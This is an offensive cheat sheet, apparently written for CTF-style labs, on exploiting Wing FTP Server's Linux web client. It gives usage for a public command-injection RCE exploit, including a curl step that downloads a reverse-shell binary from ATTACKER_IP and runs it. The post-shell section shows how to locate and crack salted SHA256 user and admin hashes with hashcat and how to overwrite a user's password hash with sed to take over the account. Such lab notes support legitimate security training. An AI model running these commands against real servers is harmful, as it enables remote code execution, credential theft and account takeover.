# Wing FTP Server (Linux web client)

Wing FTP Server can be exposed as a **web client** (HTTP) on Linux, often on a subdomain (e.g. `ftp.target.htb`). No default credentials; install-time admin is set during setup.

**Detection:** `FTP server software powered by Wing FTP Server vX.X.X` in the page or `Wing FTP Server(Free Edition)` in HTTP headers. Nmap may show `Wing FTP Server` on 80.

## CVE / RCE – command injection (web client login)

**Affects:** Wing FTP Server Linux web client (e.g. 7.4.3). Command injection via `loginok.html`; output is reflected in `dir.html`.

* **EDB:** https://www.exploit-db.com/exploits/52347  
* **Usage:**

```bash
python3 exp.py -u http://ftp.TARGET -c whoami
python3 exp.py -u http://ftp.TARGET -c 'id'
# Reverse shell: host a shell.elf and run:
python3 exp.py -u http://ftp.TARGET -c 'curl http://ATTACKER_IP:8000/shell.elf -o /tmp/shell.elf'
python3 exp.py -u http://ftp.TARGET -c 'chmod +x /tmp/shell.elf'
python3 exp.py -u http://ftp.TARGET -c '/tmp/shell.elf'
```

Use `-U USERNAME` to change login user (default `anonymous`). Shell runs as `wingftp`. Long-running reverse shells may need to be triggered and then caught quickly (session can expire).

---

## Post-shell – config and users

* **Install path:** e.g. `/opt/wftpserver` (or `/opt/wingftp`).  
* **Config:** `Data/settings.xml` — contains `<ServerPassword>` (often MD5; may not crack).  
* **Domain config:** `Data/1/settings.xml` — MySQL settings, and **password hashing:**  
  `<EnablePasswordSalting>1</EnablePasswordSalting>`  
  `<SaltingString>WingFTP</SaltingString>`  
* **User hashes:** `Data/1/users/*.xml` — `<Password>` is **SHA256($pass.$salt)**.  
  **Hashcat:** `hashcat -a0 -m 1410 hashfile /usr/share/wordlists/rockyou.txt` with hash format `hash:WingFTP` (salt = `WingFTP`).  
* **Admin hashes:** `Data/_ADMINISTRATOR/admins.xml` — same SHA256(salt.$pass) with salt `WingFTP`; crack with `-m 1410` and `hash:WingFTP`.  
* **Admin interface:** Bound to `127.0.0.1:5466` (see `_ADMINISTRATOR/settings.xml`). From shell: `curl http://127.0.0.1:5466` → redirect to `admin_login.html`. Use meterpreter `portfwd` or SSH tunnel to reach it after setting admin password (see below).

---

## World-writable user XML – overwrite password hash

If user XML files under `Data/1/users/` are world-writable (e.g. `maria.xml`, `steve.xml`, `wacky.xml`), you can replace the stored hash with a known one and then log in as that user (FTP web client or SSH if the user exists on the box).

**Generate SHA256 for overwrite:**

```bash
# Wing FTP user/admin hashes: SHA256($pass.$salt), hashcat -m 1410 with hash:WingFTP
# To set a known password, use the hash of that password (unsalted overwrite may work if app accepts it)
printf "hello" | sha256sum
# → 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
```

**Overwrite hash in XML (known plaintext “hello”):**

```bash
# SHA256 of "hello" (no salt) = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
sed -i 's/<Password>.*<\/Password>/<Password>2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824<\/Password>/' /opt/wftpserver/Data/1/users/wacky.xml
```

Then log in to the web client (or SSH) as `wacky` with password `hello`. Same idea for `admins.xml` to set admin password and use admin panel (after port forward).


## Quick reference

| Item | Value |
|------|--------|
| Web client | `http://ftp.TARGET/` (login → dir.html) |
| Exploit | EDB 52347, `python3 exp.py -u URL -c CMD` |
| User hashes | `Data/1/users/*.xml`, SHA256($pass.$salt), hashcat -m 1410 `hash:WingFTP` |
| Admin hashes | `Data/_ADMINISTRATOR/admins.xml`, same |
| Salt | From `Data/1/settings.xml` → `<SaltingString>WingFTP</SaltingString>` |
| Admin panel | localhost:5466 → port forward to access |
